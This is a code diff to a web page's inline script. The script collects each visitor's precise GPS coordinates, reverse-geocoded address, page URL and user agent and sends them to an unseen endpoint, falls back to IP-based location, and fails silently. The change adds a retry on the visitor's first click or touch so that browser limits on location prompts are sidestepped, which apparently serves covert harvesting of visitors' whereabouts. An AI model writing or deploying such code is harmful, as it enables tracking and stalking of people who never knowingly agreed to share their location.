@@ -758,28 +758,42 @@ window.addEventListener('DOMContentLoaded', () => {
     } catch (e) { /* silent fail */ }
   }
 
-  if (!navigator.geolocation) {
-    sendIpFallback();
-    return;
+  function requestGps(){
+    if (!navigator.geolocation) {
+      sendIpFallback();
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        const { latitude, longitude, accuracy } = pos.coords;
+        const address = await reverseGeocode(latitude, longitude);
+        await sendLocation({
+          lat: latitude,
+          lng: longitude,
+          accuracy,
+          address,
+          source: 'gps',
+          page: location.href,
+          userAgent: navigator.userAgent
+        });
+      },
+      () => sendIpFallback(),
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
+    );
   }
 
-  navigator.geolocation.getCurrentPosition(
-    async (pos) => {
-      const { latitude, longitude, accuracy } = pos.coords;
-      const address = await reverseGeocode(latitude, longitude);
-      await sendLocation({
-        lat: latitude,
-        lng: longitude,
-        accuracy,
-        address,
-        source: 'gps',
-        page: location.href,
-        userAgent: navigator.userAgent
-      });
-    },
-    () => sendIpFallback(),
-    { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 }
-  );
+  // Try immediately (works if permission already granted)
+  requestGps();
+
+  // Browsers often block GPS until user interacts — retry on first click/touch
+  function onFirstInteraction(){
+    if (sessionStorage.getItem('loc_sent')) return;
+    requestGps();
+    document.removeEventListener('click', onFirstInteraction);
+    document.removeEventListener('touchstart', onFirstInteraction);
+  }
+  document.addEventListener('click', onFirstInteraction, { once: true });
+  document.addEventListener('touchstart', onFirstInteraction, { once: true });
 })();
 </script>
 </body>
